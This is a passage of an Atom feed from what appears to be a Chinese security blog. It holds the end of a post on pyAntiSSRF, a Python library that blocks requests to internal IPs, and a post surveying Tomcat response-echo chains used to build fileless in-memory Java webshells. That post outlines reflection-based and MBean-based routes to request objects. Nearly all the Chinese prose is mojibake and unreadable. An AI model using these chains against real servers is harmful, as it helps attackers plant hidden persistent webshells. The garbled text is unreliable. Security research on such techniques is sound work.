&lt;/ol&gt;
&lt;p&gt;å…·ä½“æ²¡å•¥å¯è¯´çš„ï¼Œçœ‹ä»£ç ã€2ã€‘å§&lt;/p&gt;
&lt;h2 id=&quot;ä½¿ç”¨&quot;&gt;&lt;a href=&quot;#ä½¿ç”¨&quot; class=&quot;headerlink&quot; title=&quot;ä½¿ç”¨&quot;&gt;&lt;/a&gt;ä½¿ç”¨&lt;/h2&gt;&lt;p&gt;&lt;code&gt;pip install pyAntiSSRF&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 1. import &amp;amp; patch requestsåº“&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; pyAntiSSRF&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pyAntiSSRF.patchRequests()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 2. é€šè¿‡å‚æ•°anti_ssrfï¼ˆget/post/requestå‡½æ•°éƒ½æ”¯æŒï¼Œé»˜è®¤ä¸å¼€å¯ï¼‰ï¼Œæ§åˆ¶æ˜¯å¦å¼€å¯ssrfé˜²å¾¡ï¼Œå¦‚æœå¼€å¯ä¸”ç›®æ ‡ipæ˜¯å†…ç½‘ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# custom requests usage&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.get(&lt;span class=&quot;string&quot;&gt;&amp;quot;http://10.10.10.10/&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# patch requests by hijack requests.sessions.Session.request, default disable&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.get(&lt;span class=&quot;string&quot;&gt;&amp;quot;http://10.10.10.10/&amp;quot;&lt;/span&gt;, anti_ssrf=&lt;span class=&quot;literal&quot;&gt;False&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# raise Exception&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.get(&lt;span class=&quot;string&quot;&gt;&amp;quot;http://10.10.10.10/&amp;quot;&lt;/span&gt;, anti_ssrf=&lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Pythonå®‰å…¨" scheme="http://m0d9.me/categories/Python%E5%AE%89%E5%85%A8/"/>
    
    <category term="å·¥å…·" scheme="http://m0d9.me/categories/Python%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="ssrf" scheme="http://m0d9.me/tags/ssrf/"/>
    
    <category term="anti" scheme="http://m0d9.me/tags/anti/"/>
    
    <category term="python" scheme="http://m0d9.me/tags/python/"/>
    
    <category term="tools" scheme="http://m0d9.me/tags/tools/"/>
    
    <category term="pip" scheme="http://m0d9.me/tags/pip/"/>
    
  </entry>
  
  <entry>
    <title>Javaå†…å­˜shellï¼šTomcatå›æ˜¾</title>
    <link href="http://m0d9.me/2020/10/10/Java%E5%86%85%E5%AD%98shell%EF%BC%9ATomcat%E5%9B%9E%E6%98%BE/"/>
    <id>http://m0d9.me/2020/10/10/Java%E5%86%85%E5%AD%98shell%EF%BC%9ATomcat%E5%9B%9E%E6%98%BE/</id>
    <published>2020-10-10T06:19:00.000Z</published>
    <updated>2020-10-14T02:56:48.519Z</updated>
    
    <content type="html"><![CDATA[<p>Tomcatå›æ˜¾ ä¸ Javaå†…å­˜shellæœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ</p><p>åœ¨javaæ¼æ´åˆ©ç”¨ä¸­å¦‚ä½•è·å–åˆ°æ‰§è¡Œç»“æœï¼Ÿè¿™æ˜¯Tomcatå›æ˜¾çš„æœ€åŸå§‹éœ€æ±‚ï¼Œå…·ä½“å¯ä»¥å‚è€ƒã€4ã€‘ä¸­çš„è®¸å¤šæ‰‹æ³•ï¼Œè¿™é‡Œä¸å±•å¼€</p><p>å…¶ä¸­æåˆ°ä¸€ç§æ€è·¯ï¼Œè·å–responseï¼Œç„¶åç›´æ¥æ“ä½œresponseä»¥httpå½¢å¼è¿”å›ã€‚è€ŒJavaå†…å­˜shellä¸­ï¼Œå¾ˆé‡è¦çš„ä¸€ç‚¹å°±æ˜¯è·å–requestä»è€Œè·å–ä¸Šä¸‹æ–‡cotextï¼Œå…¶ä¸­è·å–requestçš„æ€è·¯ç›¸ä¼¼é€šç”¨å¯å€Ÿé‰´ã€‚</p><h2 id="å†å²èƒŒæ™¯"><a href="#å†å²èƒŒæ™¯" class="headerlink" title="å†å²èƒŒæ™¯"></a>å†å²èƒŒæ™¯</h2><p>å‚è€ƒã€1ã€‘ä¸­æä¸‰å¸ˆå‚…æ€»ç»“äº†ä¹‹å‰æ¯”è¾ƒç»å…¸çš„tomcatå›æ˜¾æ–¹å¼ï¼Œå†™çš„å¾ˆå¥½ï¼Œç›´æ¥å¤ç”¨ï¼š</p><a id="more"></a><ul><li><a href="https://www.anquanke.com/post/id/198886">ã€ŠåŸºäºå†…å­˜ Webshell çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ç ”ç©¶ã€‹</a>ï¼Œè§‚æ˜Ÿå¤§å“¥çš„æ–‡ç« ï¼Œé€šæ€springï¼Œèƒ½è§£å†³å®æˆ˜åªèƒ½å¤Ÿé‡åˆ°çš„å¤§éƒ¨åˆ†æƒ…å†µäº†ã€‚</li><li><a href="https://xz.aliyun.com/t/7348">ã€ŠTomcatä¸­ä¸€ç§åŠé€šç”¨å›æ˜¾æ–¹æ³•ã€‹</a>ï¼Œkingkkå¸ˆå‚…çš„ï¼Œè¿™ç¯‡æ–‡ç« è®²äº†é€šè¿‡åå°„ä¿®æ”¹ApplicationFilterChainå‚æ•°æ¥è®©tomcatå†ä¸‹ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™åœ¨çº¿ç¨‹ä¸­ç¼“å­˜reqå’Œrespï¼Œä¸è¶³ä¹‹å¤„åœ¨äºshiroæ— æ³•å›æ˜¾ã€‚</li><li><a href="https://xz.aliyun.com/t/7388">ã€ŠåŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ã€‹</a>ï¼Œthreedr3amå¸ˆå‚…çš„ï¼Œé€šè¿‡ä¸Šä¸€ç¯‡çš„æ–¹æ³•è·å–åˆ°reqè¿›ä¸€æ­¥è·å–contextï¼Œç„¶ååŠ¨æ€æ³¨å†Œfilterï¼Œä¸è¶³ä¹‹å¤„åœ¨äºä½¿ç”¨çš„æ˜¯ä¸Šä¸€ç¯‡çš„è·å–reqçš„æ€è·¯æ‰€ä»¥ä¹Ÿæ— æ³•shiroå›æ˜¾ã€‚</li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">ã€ŠåŸºäºå…¨å±€å‚¨å­˜çš„æ–°æ€è·¯ | Tomcatçš„ä¸€ç§é€šç”¨å›æ˜¾æ–¹æ³•ç ”ç©¶ã€‹</a>ï¼Œè¿™ç¯‡æ–‡ç« é€šè¿‡currentThread.getContextClassLoader()è·å–StandardContextï¼Œè¿›ä¸€æ­¥è·å–åˆ°responseï¼Œè§£å†³äº†shiroå›æ˜¾çš„é—®é¢˜ï¼Œä¸è¶³åœ¨äºtomcat7ä¸­æ— æ³•è·å–åˆ°StandardContextã€‚</li><li><a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">ã€ŠåŸºäºTomcatæ— æ–‡ä»¶Webshellç ”ç©¶ã€‹</a>ï¼Œæ€»ç»“ä¸Šé¢æ–‡ç« çš„æ–¹æ³•ï¼Œä¸è¶³ä¹‹å¤„åœ¨äºæ— æ³•è§£å†³tomcat7+shiroçš„é—®é¢˜ã€‚</li></ul><p>ä¹‹åè¿˜æœ‰å‡ æ®µæœ‰æ„æ€çš„æ€è·¯ï¼š</p><ul><li><p><a href="https://xz.aliyun.com/t/7535">ã€Štomcatä¸å‡ºç½‘å›æ˜¾è¿ç»­å‰§ç¬¬å…­é›†ã€‹</a>ï¼Œè€Œæä¸‰å¸ˆå‚…åœ¨ä»¥ä¸Šçš„åŸºç¡€ä¸Šï¼Œæå‡ºäº†ä¸å‰æ–‡ä¸åŒçš„è·å–RequestInfoæ€è·¯ï¼Œæ˜¯ä¸€æ¡é€šè¿‡registry&amp;Mbeanå…¨æ–°çš„é“¾ï¼Œæ˜¯ç›®å‰è§åˆ°æœ€é€šç”¨çš„æ–¹å¼äº†ï¼Œé€‚åˆtomcat7&amp;shiroã€‚</p></li><li><p><a href="https://paper.seebug.org/1181/">ã€ŠåŠè‡ªåŠ¨åŒ–æŒ–æ˜ request å®ç°å¤šç§ä¸­é—´ä»¶å›æ˜¾ã€‹</a> ,c0ny1å¸ˆå‚…æå‡ºçš„ï¼Œè‡ªåŠ¨åŒ–éå†æœç´¢å…¨å±€requestï¼Œä¸€é”¤å®šéŸ³ï¼Œç®—æ˜¯Tomcatå›æ˜¾çš„ç»ˆç« äº†ã€‚</p></li></ul><p>ä»¥ä¸‹æ¥ä¸€ä¸€å¤ç°åˆ†æè¿™äº›æ–‡ç« æåˆ°çš„å§¿åŠ¿</p><h2 id="kingkkçš„ApplicationFilterChainåˆ©ç”¨é“¾"><a href="#kingkkçš„ApplicationFilterChainåˆ©ç”¨é“¾" class="headerlink" title="kingkkçš„ApplicationFilterChainåˆ©ç”¨é“¾"></a>kingkkçš„ApplicationFilterChainåˆ©ç”¨é“¾</h2><p>è¿™ä¸ªåº”è¯¥æ˜¯kingkkå¸ˆå‚…é¦–æ¬¡åœ¨å‚è€ƒã€5ã€‘ä¸­æåˆ°çš„æ–¹æ³•ï¼Œå‚è€ƒã€6ã€‘ä¸­ä½¿ç”¨çš„ä¹Ÿæ˜¯è¿™ä¸ªæ–¹æ³•</p><h3 id="åŸç†æ€è·¯"><a href="#åŸç†æ€è·¯" class="headerlink" title="åŸç†æ€è·¯"></a>åŸç†æ€è·¯</h3><p>å¼•ç”¨Litch1 çš„æ€»ç»“</p><blockquote><p>é€šè¿‡åå°„ä¿®æ”¹æ§åˆ¶å˜é‡ï¼Œæ¥æ”¹å˜Tomcatå¤„ç†è¯·æ±‚æ—¶çš„æµç¨‹ï¼Œä½¿å¾—Tomcatå¤„ç†è¯·æ±‚æ—¶ä¾¿å°†request,responseå­˜å…¥ThreadLocalä¸­ï¼Œæœ€ååœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¾¿å¯ä»¥åˆ©ç”¨ThreadLocalæ¥å–å‡ºresponseã€‚</p></blockquote><p>å‘ç°çš„è¿‡ç¨‹æ„Ÿè§‰å¾ˆç¥å¥‡:</p><p>ApplicationFilterChainæœ‰ä¸€ä¸ªé™æ€å‚æ•°ï¼ŒlastServicedRequestï¼Œç±»å‹ä¸ºThreadLocalï¼Œåœ¨ä¸€å®šæ¡ä»¶ä¸‹ä¼šä¿ç•™ä¸Šä¸€æ¬¡è®¿é—®çš„request</p><p><img src="/images/pasted-114.png" alt="upload successful"></p><p>æ”»å‡»æµç¨‹</p><ol><li><p>åå°„ä¿®æ”¹ApplicationDispatcher.WRAP_SAME_OBJECT ä¸ºtrue</p></li><li><p>internalDoFilterè¿›å…¥elseæµç¨‹ï¼Œåˆå§‹åŒ–lastServicedRequestå’ŒlastServicedResponseä¸¤ä¸ªå˜é‡</p></li><li><p>ä»lastServicedRequestä¸­è·å–å½“å‰è¯·æ±‚requestï¼Œä»è€Œè·å–åˆ°context<br> <img src="/images/pasted-116.png" alt="upload successful"></p></li></ol><p>å…¶ä¸­ä½¿ç”¨Javaåå°„æ›´æ”¹ç§æœ‰é™æ€finalå­—æ®µï¼ŒåŸç†è¯¦è§<a href="https://cloud.tencent.com/developer/ask/195780">https://cloud.tencent.com/developer/ask/195780</a></p><h2 id="Litch1çš„Thread-amp-StandardService-åˆ©ç”¨é“¾"><a href="#Litch1çš„Thread-amp-StandardService-åˆ©ç”¨é“¾" class="headerlink" title="Litch1çš„Thread&amp;StandardService åˆ©ç”¨é“¾"></a>Litch1çš„Thread&amp;StandardService åˆ©ç”¨é“¾</h2><p>å…¶å®ç›®çš„éƒ½æ˜¯ä¸ºäº†å¯»æ‰¾å­˜å‚¨äº†requestçš„å¯¹è±¡ï¼ŒLitch1åœ¨æ­¤åŸºç¡€ä¸Šæ‰‹åŠ¨è¿½æº¯äº†Tomcatå…¨å±€å­˜å‚¨ä¸­çš„requestã€‚</p><h3 id="åŸç†æ€è·¯-1"><a href="#åŸç†æ€è·¯-1" class="headerlink" title="åŸç†æ€è·¯"></a>åŸç†æ€è·¯</h3><p>è·Ÿè¸ªçš„è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œè€Œä¸”éœ€è¦å¯¹Tomcatå¯åŠ¨æµç¨‹è¦æœ‰ä¸€å®šäº†è§£ï¼Œè¯¦æƒ…è¿˜æ˜¯å‚è€ƒã€8ã€‘ï¼ˆç…§ç€è¿½äº†ä¸‹ï¼ŒçŸ¥å…¶ç„¶ä¸çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œå¯¹Tomcatè¿˜æ˜¯ä¸å¤Ÿäº†è§£ï¼‰</p><p>æœ€åçš„åˆ©ç”¨è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">WebappClassLoaderBase -&gt;</span><br><span class="line">ApplicationContext(getResources().getContext()) -&gt; </span><br><span class="line">StandardService -&gt;</span><br><span class="line">Connector#getProtocolHandler() -&gt;</span><br><span class="line">AbstractProtocol$ConnectoinHandler -&gt;</span><br><span class="line">                global -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response</span><br></pre></td></tr></table></figure><h2 id="æä¸‰å¸ˆå‚…çš„MBean-amp-Registryçš„åˆ©ç”¨é“¾"><a href="#æä¸‰å¸ˆå‚…çš„MBean-amp-Registryçš„åˆ©ç”¨é“¾" class="headerlink" title="æä¸‰å¸ˆå‚…çš„MBean&amp;Registryçš„åˆ©ç”¨é“¾"></a>æä¸‰å¸ˆå‚…çš„MBean&amp;Registryçš„åˆ©ç”¨é“¾</h2><h3 id="åŸç†æ€è·¯-2"><a href="#åŸç†æ€è·¯-2" class="headerlink" title="åŸç†æ€è·¯"></a>åŸç†æ€è·¯</h3><p>å‚è€ƒã€2ã€‘</p><p>ä¸ŠèŠ‚ä¸­ï¼Œæ˜¯é€šè¿‡Connectorå…¥æ‰‹æ‹¿åˆ°ProtocolHandlerã€‚å…¶å®å†ä»”ç»†çœ‹ä¸€ä¸‹Connectorç±»çš„ä¾èµ–æ ‘å°±å¯ä»¥å‘ç°å…¶å®æ‰€æœ‰çš„å‚æ•°å¹¶éæ˜¯å•ç‹¬å­˜æ”¾åœ¨è¿™äº›ç±»ä¸­çš„ä¸€ä¸ªå±æ€§ä¸­çš„ï¼Œè€Œæ˜¯éƒ½è¢«æ³¨å†Œåˆ°äº†MBeanServerä¸­çš„ï¼š</p><p>æœ€åçš„åˆ©ç”¨è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Registry.getRegistry(null, null).getMBeanServer() -&gt;</span><br><span class="line">JmxMBeanServer.mbsInterceptor -&gt;</span><br><span class="line">DefaultMBeanServerInterceptor.repository -&gt;</span><br><span class="line">Registory#query -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response</span><br></pre></td></tr></table></figure><h2 id="c0ny1çš„åŠè‡ªåŠ¨åŒ–æŒ–æ˜æ€è·¯"><a href="#c0ny1çš„åŠè‡ªåŠ¨åŒ–æŒ–æ˜æ€è·¯" class="headerlink" title="c0ny1çš„åŠè‡ªåŠ¨åŒ–æŒ–æ˜æ€è·¯"></a>c0ny1çš„åŠè‡ªåŠ¨åŒ–æŒ–æ˜æ€è·¯</h2><p>è¿™ä¸ªå½“å±å¤§ç‰›çº§æ€è·¯äº†ï¼Œäººå·¥åˆ†æè°ƒç”¨é“¾å¯èƒ½æœ‰ç–æ¼ï¼Œç›´æ¥å†…å­˜æœç´¢ç›¸å…³çš„å¯¹è±¡ï¼Œç®€å•ç›´æ¥ï¼Œå¯ä»¥è¯´æ˜¯ç»ˆç»“äº†å…¨å±€æœç´¢requestæ€è·¯ï¼ˆå½“ç„¶kingkkçš„æ”¹å˜äº†tomcatå¤„ç†æµç¨‹çš„é“¾æ˜¯æ‰¾ä¸åˆ°çš„ï¼‰ï¼Œè†œæ‹œã€‚</p><p>å…·ä½“å‚è€ƒã€7ã€‘ï¼Œä»£ç æ€è·¯åŸæ–‡éƒ½æŒºè¯¦ç»†ï¼Œå°±ä¸ç­é—¨å¼„æ–§äº†</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡åªèƒ½ç®—æ˜¯å¯¹äºä»¥ä¸Šå¸ˆå‚…ä»¬æŒ–Tomcatå›æ˜¾æ–‡ç« çš„å­¦ä¹ æ€»ç»“ï¼Œä¸€ç¯‡ç¯‡æ–‡ç« è¯»æ¥ï¼Œæ„Ÿè§‰æœ‰å¸ˆå‚…ä»¬åœ¨åå±±è®ºå‰‘çš„å‘³é“ã€‚å§¿åŠ¿å›ºç„¶å¥‡å¦™ï¼Œæ›´å¥‡å¦™çš„æ˜¯å¸ˆå‚…ä»¬æ‰¾å„ç§çŒ¥çå§¿åŠ¿çš„æ€è·¯ï¼Œè·ç›ŠåŒªæµ…ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://xz.aliyun.com/t/7535">tomcatä¸å‡ºç½‘å›æ˜¾è¿ç»­å‰§ç¬¬å…­é›†</a></li><li>[2] <a href="https://lucifaer.com/2020/05/12/Tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/">Tomcaté€šç”¨å›æ˜¾å­¦ä¹ </a></li><li>[3] <a href="https://www.cnblogs.com/potatsoSec/p/13060261.html">tomcatç»“åˆshiroæ— æ–‡ä»¶webshellçš„æŠ€æœ¯ç ”ç©¶ä»¥åŠæ£€æµ‹æ–¹æ³•</a></li><li>[4] <a href="https://l3yx.github.io/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/">Java Webä»£ç æ‰§è¡Œæ¼æ´å›æ˜¾æ€»ç»“</a></li><li>[5] <a href="https://xz.aliyun.com/t/7348">Tomcatä¸­ä¸€ç§åŠé€šç”¨å›æ˜¾æ–¹æ³•</a></li><li>[6] <a href="https://xz.aliyun.com/t/7388#toc-1">åŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯</a></li><li>[7] <a href="https://paper.seebug.org/1181/">åŠè‡ªåŠ¨åŒ–æŒ–æ˜ request å®ç°å¤šç§ä¸­é—´ä»¶å›æ˜¾</a></li><li>[8] <a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">åŸºäºå…¨å±€å‚¨å­˜çš„æ–°æ€è·¯ | Tomcatçš„ä¸€ç§é€šç”¨å›æ˜¾æ–¹æ³•ç ”ç©¶</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Tomcatå›æ˜¾ ä¸ Javaå†…å­˜shellæœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ&lt;/p&gt;
&lt;p&gt;åœ¨javaæ¼æ´åˆ©ç”¨ä¸­å¦‚ä½•è·å–åˆ°æ‰§è¡Œç»“æœï¼Ÿè¿™æ˜¯Tomcatå›æ˜¾çš„æœ€åŸå§‹éœ€æ±‚ï¼Œå…·ä½“å¯ä»¥å‚è€ƒã€4ã€‘ä¸­çš„è®¸å¤šæ‰‹æ³•ï¼Œè¿™é‡Œä¸å±•å¼€&lt;/p&gt;
&lt;p&gt;å…¶ä¸­æåˆ°ä¸€ç§æ€è·¯ï¼Œè·å–responseï¼Œç„¶åç›´æ¥æ“ä½œresponseä»¥httpå½¢å¼è¿”å›ã€‚è€ŒJavaå†…å­˜shellä¸­ï¼Œå¾ˆé‡è¦çš„ä¸€ç‚¹å°±æ˜¯è·å–requestä»è€Œè·å–ä¸Šä¸‹æ–‡cotextï¼Œå…¶ä¸­è·å–requestçš„æ€è·¯ç›¸ä¼¼é€šç”¨å¯å€Ÿé‰´ã€‚&lt;/p&gt;
&lt;h2 id=&quot;å†å²èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#å†å²èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;å†å²èƒŒæ™¯&quot;&gt;&lt;/a&gt;å†å²èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;å‚è€ƒã€1ã€‘ä¸­æä¸‰å¸ˆå‚…æ€»ç»“äº†ä¹‹å‰æ¯”è¾ƒç»å…¸çš„tomcatå›æ˜¾æ–¹å¼ï¼Œå†™çš„å¾ˆå¥½ï¼Œç›´æ¥å¤ç”¨ï¼š&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Tomcat" scheme="http://m0d9.me/tags/Tomcat/"/>
    
    <category term="å›æ˜¾" scheme="http://m0d9.me/tags/%E5%9B%9E%E6%98%BE/"/>
    
  </entry>
  
</feed>
